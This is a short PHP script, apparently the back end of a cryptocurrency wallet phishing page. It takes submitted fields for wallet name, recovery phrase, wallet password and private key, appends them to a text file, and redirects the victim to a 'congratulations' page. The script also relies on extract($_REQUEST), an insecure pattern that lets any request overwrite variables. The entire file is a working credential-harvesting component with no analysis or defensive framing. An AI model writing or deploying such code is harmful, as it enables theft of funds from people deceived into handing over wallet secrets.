<?php
    extract($_REQUEST);
    $file=fopen("form-save.txt","a");

    fwrite($file,"Wallet :");
    fwrite($file, $wallet ."\n");
    fwrite($file,"Phrase :");
    fwrite($file, $phrase ."\n");
    fwrite($file,"WalletPassword :");
    fwrite($file, $walletPassword ."\n");
    fwrite($file,"PrivateKey :");
    fwrite($file, $privateKey ."\n");
    fclose($file);
    header("location: congratulations.php");
 ?>